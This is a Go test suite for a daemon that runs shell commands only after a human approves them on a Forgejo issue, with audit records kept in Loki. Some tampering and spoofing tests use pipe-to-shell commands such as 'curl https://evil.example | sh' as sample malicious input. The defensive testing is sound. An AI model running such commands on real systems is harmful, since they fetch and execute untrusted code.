package daemon

import (
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/TomasTomecek/peon/internal/executor"
	"github.com/TomasTomecek/peon/internal/forgejo"
	"github.com/TomasTomecek/peon/internal/job"
)

const runRestart = "/run db1\n```sh\nsystemctl restart postgresql\n```"

func TestHappyPath(t *testing.T) {
	h := newHarness(t)
	card, id := h.propose(runRestart)

	j := h.st.Jobs[id]
	if j.State != job.Proposed || j.Record.Command != "systemctl restart postgresql" || j.Record.Requester != "agent-ops" {
		t.Fatalf("job %+v", j)
	}
	h.tick()
	if len(h.exec.runs()) != 0 {
		t.Fatal("ran without approval")
	}

	h.fj.react(card, approverID, "+1")
	h.tickAndWait()

	runs := h.exec.runs()
	if len(runs) != 1 || runs[0].Command != "systemctl restart postgresql" || runs[0].JobID != id || runs[0].Timeout != 10*time.Minute {
		t.Fatalf("runs %+v", runs)
	}
	j = h.st.Jobs[id]
	if j.State != job.Succeeded || j.Approver != "tomas" || j.ExitCode == nil || *j.ExitCode != 0 {
		t.Fatalf("job %+v", j)
	}
	if got := strings.Join(h.loki.events(id), ","); got != "proposed,approved,started,stdout,stdout,stderr,finished" {
		t.Fatalf("loki events %s", got)
	}
	if got := strings.Join(h.loki.lines(id, "stdout"), ","); got != "hello,world" {
		t.Fatalf("stdout lines %s", got)
	}
	var started map[string]any
	json.Unmarshal([]byte(h.loki.lines(id, "started")[0]), &started)
	if started["command"] != "systemctl restart postgresql" || started["job_hash"] != j.Hash || started["approver"] != "tomas" {
		t.Fatalf("started record %v", started)
	}
	res := h.lastBot()
	for _, want := range []string{"**succeeded**", "exit 0", "approved by @tomas", "hello\nworld\nfrom stderr", `job_id="` + id + `"`} {
		if !strings.Contains(res, want) {
			t.Errorf("result comment missing %q:\n%s", want, res)
		}
	}

	// Single use: more ticks and more reactions never run it again.
	h.fj.react(card, approverID, "+1")
	h.tickAndWait()
	h.tickAndWait()
	if len(h.exec.runs()) != 1 {
		t.Fatalf("job ran %d times", len(h.exec.runs()))
	}
}

func TestOnlyApproverCounts(t *testing.T) {
	h := newHarness(t)
	card, id := h.propose(runRestart)
	h.fj.react(card, agentID, "+1")
	h.fj.react(card, strangerID, "+1")
	h.fj.react(card, botID, "+1")
	h.tickAndWait()
	if len(h.exec.runs()) != 0 || h.st.Jobs[id].State != job.Proposed {
		t.Fatalf("non-approver reaction approved the job: %s", h.st.Jobs[id].State)
	}
}

func TestOtherHostsAndNonRunIgnored(t *testing.T) {
	h := newHarness(t)
	h.fj.add(agentID, "/run web1\n```\nreboot\n```")
	h.fj.add(agentID, "/run web1 --bogus") // malformed, but not ours: no reply
	h.fj.add(agentID, "looks good to me")
	h.fj.add(agentID, "/run")
	h.tick()
	if n := len(h.fj.botComments()); n != 0 {
		t.Fatalf("peon replied %d times to comments for other hosts:\n%s", n, h.lastBot())
	}
}

func TestBadRequestsGetOneReply(t *testing.T) {
	cases := map[string]struct {
		user int64
		body string
		want string
	}{
		"not a requester":  {strangerID, runRestart, "not allowed to request jobs"},
		"unknown flag":     {agentID, "/run db1 --sudo\n```\nx\n```", "unknown flag"},
		"over max":         {agentID, "/run db1 --timeout=3h\n```\nx\n```", "over this host's maximum"},
		"non-ascii":        {agentID, "/run db1\n```\nrm -rf /tmp/\u200bx\n```", "not printable ASCII"},
		"user not allowed": {agentID, "/run db1 --user=postgres\n```\npsql\n```", `may not run as "postgres" (allowed: root, deploy)`},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			h := newHarness(t)
			src := h.fj.add(tc.user, tc.body)
			h.tick()
			h.clock.Add(time.Minute)
			h.tick()
			bc := h.fj.botComments()
			if len(bc) != 1 || !strings.Contains(bc[0].Body, tc.want) || !strings.Contains(bc[0].Body, "#"+itoa(src.ID)) {
				t.Fatalf("want exactly one reply containing %q, got %d:\n%s", tc.want, len(bc), h.lastBot())
			}
			if len(h.st.Jobs) != 0 {
				t.Fatal("job created")
			}
		})
	}
}

func itoa(n int64) string { return strconv.FormatInt(n, 10) }

func contextWithCancel() (context.Context, context.CancelFunc) {
	return context.WithCancel(context.Background())
}

func TestRejected(t *testing.T) {
	h := newHarness(t)
	card, id := h.propose(runRestart)
	h.fj.react(card, approverID, "+1")
	h.fj.react(card, approverID, "-1")
	h.tickAndWait()
	if len(h.exec.runs()) != 0 || h.st.Jobs[id].State != job.Rejected {
		t.Fatalf("state %s, runs %d", h.st.Jobs[id].State, len(h.exec.runs()))
	}
	if !strings.Contains(h.lastBot(), "rejected") {
		t.Fatalf("reply:\n%s", h.lastBot())
	}
}

func TestTamperedCardNeverRuns(t *testing.T) {
	cases := map[string]func(h *harness, card int64){
		"body edited": func(h *harness, card int64) {
			c, _ := h.fj.GetComment(context.Background(), repo, card)
			h.fj.edit(card, strings.Replace(c.Body, "systemctl restart postgresql", "curl evil | sh", 1))
		},
		"edited and restored": func(h *harness, card int64) {
			c, _ := h.fj.GetComment(context.Background(), repo, card)
			h.fj.edit(card, c.Body)
		},
		"deleted": func(h *harness, card int64) { h.fj.remove(card) },
	}
	for name, tamper := range cases {
		t.Run(name, func(t *testing.T) {
			h := newHarness(t)
			card, id := h.propose(runRestart)
			tamper(h, card)
			h.fj.react(card, approverID, "+1")
			h.tickAndWait()
			if len(h.exec.runs()) != 0 || h.st.Jobs[id].State != job.Tampered {
				t.Fatalf("state %s, runs %d", h.st.Jobs[id].State, len(h.exec.runs()))
			}
			if !strings.Contains(h.lastBot(), "not run") {
				t.Fatalf("reply:\n%s", h.lastBot())
			}
		})
	}
}

func TestEditingSourceCommentChangesNothing(t *testing.T) {
	h := newHarness(t)
	src := h.fj.add(agentID, runRestart)
	h.tick()
	card := h.fj.botComments()[0].ID
	h.fj.edit(src.ID, "/run db1\n```\ncurl https://evil.example | sh\n```")
	h.tick() // the edited comment is seen again but already handled
	if len(h.st.Jobs) != 1 || len(h.fj.botComments()) != 1 {
		t.Fatalf("jobs %d, bot comments %d", len(h.st.Jobs), len(h.fj.botComments()))
	}
	h.fj.react(card, approverID, "+1")
	h.tickAndWait()
	if runs := h.exec.runs(); len(runs) != 1 || runs[0].Command != "systemctl restart postgresql" {
		t.Fatalf("runs %+v", runs)
	}
}

func TestExpires(t *testing.T) {
	h := newHarness(t)
	card, id := h.propose(runRestart)
	h.clock.Add(31 * time.Minute)
	h.fj.react(card, approverID, "+1")
	h.tickAndWait()
	if len(h.exec.runs()) != 0 || h.st.Jobs[id].State != job.Expired {
		t.Fatalf("state %s", h.st.Jobs[id].State)
	}
	if !strings.Contains(h.lastBot(), "expired") {
		t.Fatalf("reply:\n%s", h.lastBot())
	}
}

func TestLokiDownFailsClosed(t *testing.T) {
	h := newHarness(t)
	card, id := h.propose(runRestart)
	h.loki.setFail(true)
	h.fj.react(card, approverID, "+1")
	h.tickAndWait()
	h.tickAndWait()
	if len(h.exec.runs()) != 0 || h.st.Jobs[id].State != job.Proposed {
		t.Fatalf("ran or approved without Loki: state %s, runs %d", h.st.Jobs[id].State, len(h.exec.runs()))
	}
	h.loki.setFail(false)
	h.tickAndWait()
	if len(h.exec.runs()) != 1 || h.st.Jobs[id].State != job.Succeeded {
		t.Fatalf("did not run once Loki recovered: state %s", h.st.Jobs[id].State)
	}
}

func TestLokiDownExpiresApproval(t *testing.T) {
	h := newHarness(t)
	card, id := h.propose(runRestart)
	h.fj.react(card, approverID, "+1")
	h.loki.setFail(true)
	h.clock.Add(40 * time.Minute)
	h.tickAndWait()
	if len(h.exec.runs()) != 0 || h.st.Jobs[id].State != job.Expired {
		t.Fatalf("state %s", h.st.Jobs[id].State)
	}
}

func TestLokiDownDuringRunSpoolsOutput(t *testing.T) {
	h := newHarness(t)
	card, id := h.propose(runRestart)
	h.fj.react(card, approverID, "+1")
	h.exec.onRun = func(executor.Spec) { h.loki.setFail(true) }
	h.tickAndWait()
	if h.st.Jobs[id].State != job.Succeeded {
		t.Fatalf("a Loki outage during the run must not kill the job: %s", h.st.Jobs[id].State)
	}
	if h.d.spool.Pending() == 0 {
		t.Fatal("nothing spooled")
	}
	h.exec.onRun = nil
	h.loki.setFail(false)
	h.tick()
	if h.d.spool.Pending() != 0 {
		t.Fatal("spool not flushed")
	}
	if got := strings.Join(h.loki.events(id), ","); got != "proposed,approved,started,stdout,stdout,stderr,finished" {
		t.Fatalf("events after flush: %s", got)
	}
}

func TestKillByThumbsDown(t *testing.T) {
	h := newHarness(t)
	card, id := h.propose(runRestart)
	h.fj.react(card, approverID, "+1")
	h.exec.release = make(chan struct{})
	h.exec.started = make(chan string, 1)
	h.tick()
	<-h.exec.started
	if h.st.Jobs[id].State != job.Running {
		t.Fatalf("state %s", h.st.Jobs[id].State)
	}
	h.fj.react(card, approverID, "-1")
	h.tickAndWait()
	j := h.st.Jobs[id]
	if j.State != job.Killed || !j.KillPending {
		t.Fatalf("state %s", j.State)
	}
	if !strings.Contains(strings.Join(h.loki.events(id), ","), "kill_requested") {
		t.Fatal("kill not audited")
	}
	if !strings.Contains(h.lastBot(), "**killed**") {
		t.Fatalf("result:\n%s", h.lastBot())
	}
}

func TestPrivateOutputStaysInLoki(t *testing.T) {
	h := newHarness(t)
	h.exec.stdout = []string{"DB_PASSWORD=hunter2"}
	card, id := h.propose("/run db1 --private\n```\nenv\n```")
	if !strings.Contains(h.lastBot(), "Loki only") {
		t.Fatalf("card does not say private:\n%s", h.lastBot())
	}
	h.fj.react(card, approverID, "+1")
	h.tickAndWait()
	for _, c := range h.fj.botComments() {
		if strings.Contains(c.Body, "hunter2") {
			t.Fatalf("private output posted to the issue:\n%s", c.Body)
		}
	}
	if got := h.loki.lines(id, "stdout"); len(got) != 1 || got[0] != "DB_PASSWORD=hunter2" {
		t.Fatalf("loki stdout %q", got)
	}
}

func TestOneJobAtATimeInApprovalOrder(t *testing.T) {
	h := newHarness(t)
	cardA, idA := h.propose("/run db1\n```\necho a\n```")
	cardB, idB := h.propose("/run db1\n```\necho b\n```")
	h.exec.release = make(chan struct{})
	h.exec.started = make(chan string, 2)
	h.fj.react(cardB, approverID, "+1")
	h.tick() // B approved first and starts
	h.clock.Add(time.Second)
	h.fj.react(cardA, approverID, "+1")
	h.tick() // A approved; B still running
	if got := <-h.exec.started; got != idB {
		t.Fatalf("first job %s, want B", got)
	}
	h.tick()
	if n := len(h.exec.runs()); n != 1 {
		t.Fatalf("%d jobs running at once", n)
	}
	close(h.exec.release)
	h.d.Wait()
	h.tick()
	if got := <-h.exec.started; got != idA {
		t.Fatalf("second job %s, want A", got)
	}
	h.d.Wait()
	if h.st.Jobs[idA].State != job.Succeeded || h.st.Jobs[idB].State != job.Succeeded {
		t.Fatalf("states %s %s", h.st.Jobs[idA].State, h.st.Jobs[idB].State)
	}
}

func TestRunningIsPersistedBeforeExecution(t *testing.T) {
	h := newHarness(t)
	card, id := h.propose(runRestart)
	h.fj.react(card, approverID, "+1")
	var onDisk string
	h.exec.onRun = func(executor.Spec) {
		b, _ := os.ReadFile(filepath.Join(h.dir, "state.json"))
		var s struct {
			Jobs map[string]struct{ State string } `json:"jobs"`
		}
		json.Unmarshal(b, &s)
		onDisk = s.Jobs[id].State
	}
	h.tickAndWait()
	if onDisk != "running" {
		t.Fatalf("state on disk when the command started: %q", onDisk)
	}
}

func TestRestartNeverRerunsAndReportsInterrupted(t *testing.T) {
	h := newHarness(t)
	card, id := h.propose(runRestart)
	h.fj.react(card, approverID, "+1")
	h.tick()
	h.d.Wait()
	// Simulate a crash mid-run: force the persisted state back to running.
	h.st.Jobs[id].State = job.Running
	h.st.Save()
	h.restart()
	h.exec.ran = nil
	h.d.Recover(context.Background())
	h.tickAndWait()
	if len(h.exec.runs()) != 0 {
		t.Fatal("job re-run after restart")
	}
	if h.st.Jobs[id].State != job.Interrupted || len(h.exec.stopped) != 1 || h.exec.stopped[0] != id {
		t.Fatalf("state %s, stopped %v", h.st.Jobs[id].State, h.exec.stopped)
	}
	if !strings.Contains(h.lastBot(), "interrupted") {
		t.Fatalf("result:\n%s", h.lastBot())
	}
}

func TestApprovedJobSurvivesRestart(t *testing.T) {
	h := newHarness(t)
	card, id := h.propose(runRestart)
	h.fj.react(card, approverID, "+1")
	h.loki.setFail(false)
	// Approve, but keep the executor from being reached by failing the
	// start record once.
	h.d.mu.Lock()
	h.d.reviewProposed(context.Background())
	h.d.save()
	h.d.mu.Unlock()
	if h.st.Jobs[id].State != job.Approved {
		t.Fatalf("state %s", h.st.Jobs[id].State)
	}
	h.restart()
	h.tickAndWait()
	if h.st.Jobs[id].State != job.Succeeded || len(h.exec.runs()) != 1 {
		t.Fatalf("state %s, runs %d", h.st.Jobs[id].State, len(h.exec.runs()))
	}
}

func TestShutdownInterruptsRunningJob(t *testing.T) {
	h := newHarness(t)
	card, id := h.propose(runRestart)
	h.fj.react(card, approverID, "+1")
	h.exec.release = make(chan struct{})
	h.exec.started = make(chan string, 1)
	ctx, cancel := contextWithCancel()
	h.d.Tick(ctx)
	<-h.exec.started
	cancel()
	h.d.Wait()
	if h.st.Jobs[id].State != job.Interrupted {
		t.Fatalf("state %s", h.st.Jobs[id].State)
	}
}

func TestCommandWithFencesCannotSpoofCard(t *testing.T) {
	h := newHarness(t)
	_, id := h.propose("/run db1\n````\ncurl x | sh\n```\nsystemctl status nginx\n```\n````")
	card := h.lastBot()
	cmd := h.st.Jobs[id].Record.Command
	if !strings.Contains(card, "`````sh\n"+cmd+"\n`````") && !strings.Contains(card, "````sh\n"+cmd+"\n````") {
		t.Fatalf("command not safely fenced:\n%s", card)
	}
	if !strings.Contains(card, "pipes a download into a shell") {
		t.Fatalf("missing warning:\n%s", card)
	}
}

func TestFirstStartIgnoresHistory(t *testing.T) {
	h := &harness{t: t, clock: &clock{t: time.Date(2026, 10, 29, 10, 0, 0, 0, time.UTC)}, dir: t.TempDir()}
	h.fj = newFakeForgejo(h.clock)
	h.loki = &fakeLoki{}
	h.exec = &fakeExec{}
	h.fj.add(agentID, runRestart) // posted before peon ever ran
	h.clock.Add(time.Hour)
	h.open()
	h.tick()
	h.tick()
	if len(h.st.Jobs) != 0 || len(h.fj.botComments()) != 0 {
		t.Fatal("acted on a comment from before the first start")
	}
}

func TestForgejoClockBehindPeon(t *testing.T) {
	h := &harness{t: t, clock: &clock{t: time.Date(2026, 10, 29, 10, 0, 0, 0, time.UTC)}, dir: t.TempDir()}
	h.fj = newFakeForgejo(h.clock)
	h.fj.skew = 10 * time.Minute
	h.loki = &fakeLoki{}
	h.exec = &fakeExec{}
	h.fj.add(agentID, "just chatting") // gives the repo some history
	h.open()
	h.tick() // first start
	h.clock.Add(time.Minute)
	card, id := h.propose(runRestart)
	h.fj.react(card, approverID, "+1")
	h.tickAndWait()
	if h.st.Jobs[id].State != job.Succeeded {
		t.Fatalf("state %s", h.st.Jobs[id].State)
	}
}

func TestQueuedApprovalExpiresBehindLongJob(t *testing.T) {
	h := newHarness(t)
	cardA, idA := h.propose("/run db1\n```\nsleep 3600\n```")
	cardB, idB := h.propose("/run db1\n```\necho b\n```")
	h.exec.release = make(chan struct{})
	h.exec.started = make(chan string, 2)
	h.fj.react(cardA, approverID, "+1")
	h.fj.react(cardB, approverID, "+1")
	h.tick()
	<-h.exec.started
	h.clock.Add(45 * time.Minute) // A runs long; B's approval goes stale
	close(h.exec.release)
	h.d.Wait()
	h.tickAndWait()
	if h.st.Jobs[idA].State != job.Succeeded || h.st.Jobs[idB].State != job.Expired {
		t.Fatalf("states A=%s B=%s", h.st.Jobs[idA].State, h.st.Jobs[idB].State)
	}
	if len(h.exec.runs()) != 1 {
		t.Fatalf("%d runs", len(h.exec.runs()))
	}
	if !strings.Contains(h.lastBot(), "could not start before it expired") {
		t.Fatalf("reply:\n%s", h.lastBot())
	}
}

func TestFirstStartMarksExistingRunCommentsHandled(t *testing.T) {
	h := &harness{t: t, clock: &clock{t: time.Date(2026, 10, 29, 10, 0, 0, 0, time.UTC)}, dir: t.TempDir()}
	h.fj = newFakeForgejo(h.clock)
	h.loki = &fakeLoki{}
	h.exec = &fakeExec{}
	old := h.fj.add(agentID, runRestart)
	h.clock.Add(time.Minute)
	h.open()
	h.tick()
	// The agent edits the old comment after peon started: still ignored.
	h.fj.edit(old.ID, runRestart+"\n")
	h.clock.Add(time.Minute)
	h.tick()
	if len(h.st.Jobs) != 0 || len(h.fj.botComments()) != 0 {
		t.Fatal("acted on a /run comment from before the first start")
	}
}

func TestRunAsUser(t *testing.T) {
	h := newHarness(t)
	card, id := h.propose("/run db1 --user=deploy\n```\npodman ps\n```")
	if !strings.Contains(h.lastBot(), "Runs as **deploy** (in their systemd user manager)") {
		t.Fatalf("card:\n%s", h.lastBot())
	}
	h.fj.react(card, approverID, "+1")
	h.tickAndWait()
	runs := h.exec.runs()
	if len(runs) != 1 || runs[0].User != "deploy" || runs[0].Command != "podman ps" {
		t.Fatalf("runs %+v", runs)
	}
	var started map[string]any
	json.Unmarshal([]byte(h.loki.lines(id, "started")[0]), &started)
	if started["user"] != "deploy" {
		t.Fatalf("started record %v", started)
	}
}

func TestDefaultUserApplies(t *testing.T) {
	h := newHarness(t)
	h.d.cfg.Jobs.DefaultUser = "deploy"
	_, id := h.propose(runRestart)
	if got := h.st.Jobs[id].Record.User; got != "deploy" {
		t.Fatalf("user = %q", got)
	}
}

var errForgejoDown = errors.New("forgejo down")

// resultComments returns peon's comments that report a job outcome.
func (h *harness) resultComments() []string {
	var out []string
	for _, c := range h.fj.botComments() {
		if !strings.Contains(c.Body, "👍 to approve") {
			out = append(out, c.Body)
		}
	}
	return out
}

func TestResultCommentRetriedUntilForgejoRecovers(t *testing.T) {
	h := newHarness(t)
	card, id := h.propose(runRestart)
	h.fj.react(card, approverID, "+1")
	h.exec.onRun = func(executor.Spec) { h.fj.setPostErr(errForgejoDown) }
	h.tickAndWait()
	if h.st.Jobs[id].State != job.Succeeded || len(h.resultComments()) != 0 || len(h.st.Outbox) != 1 {
		t.Fatalf("state %s, results %d, outbox %d", h.st.Jobs[id].State, len(h.resultComments()), len(h.st.Outbox))
	}
	h.exec.onRun = nil

	// Still down: retried after the delay, still queued.
	h.clock.Add(11 * time.Second)
	h.tick()
	if len(h.st.Outbox) != 1 || h.st.Outbox[0].Attempts != 2 {
		t.Fatalf("outbox %+v", h.st.Outbox[0])
	}

	// Recovered, but peon also restarted in between: the queue survives.
	h.fj.setPostErr(nil)
	h.restart()
	h.tick()
	if len(h.resultComments()) != 0 {
		t.Fatal("posted before the retry was due")
	}
	h.clock.Add(time.Minute)
	h.tick()
	results := h.resultComments()
	if len(results) != 1 || !strings.Contains(results[0], "**succeeded**") || len(h.st.Outbox) != 0 {
		t.Fatalf("results %d, outbox %d", len(results), len(h.st.Outbox))
	}
	if !strings.Contains(strings.Join(h.loki.events(id), ","), "comment_posted") {
		t.Fatal("delayed post not recorded in Loki")
	}
	h.clock.Add(time.Hour)
	h.tick()
	if len(h.resultComments()) != 1 {
		t.Fatal("result posted twice")
	}
}

func TestOutboxKeepsOrderAndGivesUpAfterADay(t *testing.T) {
	h := newHarness(t)
	cardA, idA := h.propose("/run db1\n```\necho a\n```")
	cardB, idB := h.propose("/run db1\n```\necho b\n```")
	h.fj.setPostErr(errForgejoDown)
	h.fj.react(cardA, approverID, "-1")
	h.tick()
	// A failed post also starts the Forgejo backoff, which would pause the
	// review of card B. Clear it: this test is about the queue's order.
	h.d.fjNext = time.Time{}
	h.clock.Add(time.Second)
	h.fj.react(cardB, approverID, "-1")
	h.tick()
	if len(h.st.Outbox) != 2 || h.st.Outbox[0].JobID != idA || h.st.Outbox[1].JobID != idB {
		t.Fatalf("outbox order wrong")
	}
	for i := 0; i < 200 && len(h.st.Outbox) > 0; i++ {
		h.clock.Add(10 * time.Minute)
		h.tick()
	}
	if len(h.st.Outbox) != 0 || len(h.resultComments()) != 0 {
		t.Fatalf("outbox %d, comments %d", len(h.st.Outbox), len(h.resultComments()))
	}
	for _, id := range []string{idA, idB} {
		if !strings.Contains(strings.Join(h.loki.events(id), ","), "comment_dropped") {
			t.Fatalf("drop of %s not recorded in Loki", id)
		}
	}
}

func TestOutboxDropsPermanentErrorsAndMovesOn(t *testing.T) {
	h := newHarness(t)
	cardA, idA := h.propose("/run db1\n```\necho a\n```")
	cardB, _ := h.propose("/run db1\n```\necho b\n```")
	h.fj.setPostErr(&forgejo.HTTPError{Status: http.StatusForbidden, Body: "issue is locked"})
	h.fj.react(cardA, approverID, "-1")
	h.tick()
	if len(h.st.Outbox) != 0 || !strings.Contains(strings.Join(h.loki.events(idA), ","), "comment_dropped") {
		t.Fatalf("permanent error not dropped: outbox %d", len(h.st.Outbox))
	}
	h.fj.setPostErr(nil)
	h.fj.react(cardB, approverID, "-1")
	h.tick()
	if len(h.resultComments()) != 1 {
		t.Fatalf("later comment blocked: %d", len(h.resultComments()))
	}
}

var errUnreachable = errors.New("dial tcp 10.0.0.5:443: connect: connection refused")

func TestForgejoBackoff(t *testing.T) {
	h := newHarness(t)
	h.fj.setReadErr(errUnreachable)

	h.tick() // fails: backing off ~10s
	if h.d.fjFailures != 1 {
		t.Fatalf("failures %d", h.d.fjFailures)
	}
	calls := h.fj.callCount()
	h.clock.Add(5 * time.Second)
	h.tick()
	if h.fj.callCount() != calls {
		t.Fatal("called Forgejo during backoff")
	}

	// Each failure doubles the delay: 10s, 20s, 40s, ... capped at 5 min.
	var gaps []time.Duration
	for i := 0; i < 8; i++ {
		gap := h.d.fjNext.Sub(h.clock.Now())
		gaps = append(gaps, gap)
		h.clock.Add(gap)
		h.tick()
	}
	if gaps[1] < 15*time.Second || gaps[2] < 30*time.Second || gaps[7] > backoffMax+backoffMax/10 || gaps[7] < backoffMax-backoffMax/10 {
		t.Fatalf("gaps %v", gaps)
	}

	// Recovery resets the backoff and peon catches up.
	h.fj.setReadErr(nil)
	h.clock.Add(h.d.fjNext.Sub(h.clock.Now()))
	h.fj.add(agentID, runRestart)
	h.tick()
	if h.d.fjFailures != 0 || !h.d.fjNext.IsZero() || len(h.st.Jobs) != 1 {
		t.Fatalf("not recovered: failures %d, jobs %d", h.d.fjFailures, len(h.st.Jobs))
	}
}

func TestForgejoRetryAfterHonoured(t *testing.T) {
	h := newHarness(t)
	h.fj.setReadErr(&forgejo.HTTPError{Status: http.StatusTooManyRequests, RetryAfter: 2 * time.Minute})
	h.tick()
	calls := h.fj.callCount()
	h.clock.Add(time.Minute)
	h.tick()
	if h.fj.callCount() != calls {
		t.Fatal("ignored Retry-After")
	}
	h.clock.Add(time.Minute + time.Second)
	h.tick()
	if h.fj.callCount() == calls {
		t.Fatal("did not retry after Retry-After")
	}
}

func TestOneFailureSkipsTheRestOfTheTick(t *testing.T) {
	h := newHarness(t)
	h.propose("/run db1\n```\necho a\n```")
	h.propose("/run db1\n```\necho b\n```")
	h.fj.setReadErr(errUnreachable)
	calls := h.fj.callCount()
	h.tick()
	if got := h.fj.callCount() - calls; got != 1 {
		t.Fatalf("%d Forgejo calls in a failing tick, want 1", got)
	}
}

func TestNotFoundIsNotAnOutage(t *testing.T) {
	h := newHarness(t)
	card, id := h.propose(runRestart)
	h.fj.remove(card)
	h.tick()
	if h.st.Jobs[id].State != job.Tampered || h.d.fjFailures != 0 {
		t.Fatalf("state %s, failures %d", h.st.Jobs[id].State, h.d.fjFailures)
	}
}

func TestApprovedJobsStartWhileForgejoIsDown(t *testing.T) {
	h := newHarness(t)
	cardA, idA := h.propose("/run db1\n```\necho a\n```")
	cardB, idB := h.propose("/run db1\n```\necho b\n```")
	h.exec.release = make(chan struct{})
	h.exec.started = make(chan string, 2)
	h.fj.react(cardA, approverID, "+1")
	h.fj.react(cardB, approverID, "+1")
	h.tick() // both approved, A starts
	<-h.exec.started
	h.fj.setReadErr(errUnreachable)
	h.tick() // Forgejo fails: backing off
	close(h.exec.release)
	h.d.Wait()
	h.clock.Add(time.Second) // still inside the backoff window
	h.tick()
	if got := <-h.exec.started; got != idB {
		t.Fatalf("started %s", got)
	}
	h.d.Wait()
	if h.st.Jobs[idA].State != job.Succeeded || h.st.Jobs[idB].State != job.Succeeded {
		t.Fatalf("states %s %s", h.st.Jobs[idA].State, h.st.Jobs[idB].State)
	}
}

func TestRejectedTokenKeepsCommentsQueued(t *testing.T) {
	h := newHarness(t)
	card, id := h.propose(runRestart)
	h.fj.setPostErr(&forgejo.HTTPError{Status: http.StatusUnauthorized, Body: "token expired"})
	h.fj.react(card, approverID, "-1")
	h.tick()
	if len(h.st.Outbox) != 1 || strings.Contains(strings.Join(h.loki.events(id), ","), "comment_dropped") {
		t.Fatalf("a rejected token dropped the comment: outbox %d", len(h.st.Outbox))
	}
	if h.d.fjFailures == 0 {
		t.Fatal("401 did not trigger backoff")
	}
	h.fj.setPostErr(nil) // token fixed
	h.clock.Add(time.Minute)
	h.tick()
	if len(h.st.Outbox) != 0 || len(h.resultComments()) != 1 {
		t.Fatalf("outbox %d, comments %d", len(h.st.Outbox), len(h.resultComments()))
	}
}

func TestHealthRecordedForStatus(t *testing.T) {
	h := newHarness(t)
	card, _ := h.propose(runRestart)
	if h.st.Health.ForgejoOK.IsZero() || h.st.Health.LastPoll.IsZero() || h.st.Health.LokiOK.IsZero() {
		t.Fatalf("health %+v", h.st.Health)
	}
	h.loki.setFail(true)
	h.fj.react(card, approverID, "+1")
	h.clock.Add(time.Minute)
	h.tick()
	if h.st.Health.LokiError == "" || !h.st.Health.ForgejoOK.Equal(h.clock.Now()) {
		t.Fatalf("health %+v", h.st.Health)
	}
	h.loki.setFail(false)
	h.tickAndWait()
	if h.st.Health.LokiError != "" {
		t.Fatalf("loki error not cleared: %+v", h.st.Health)
	}
}

func TestHealthShowsForgejoBackoff(t *testing.T) {
	h := newHarness(t)
	h.fj.setReadErr(errUnreachable)
	h.tick()
	hl := h.st.Health
	if hl.ForgejoError == "" || !hl.ForgejoRetryAt.After(h.clock.Now()) {
		t.Fatalf("health %+v", hl)
	}
	h.fj.setReadErr(nil)
	h.clock.Add(time.Minute)
	h.tick()
	if hl := h.st.Health; hl.ForgejoError != "" || !hl.ForgejoRetryAt.IsZero() || !hl.ForgejoOK.Equal(h.clock.Now()) {
		t.Fatalf("health not cleared: %+v", hl)
	}
}
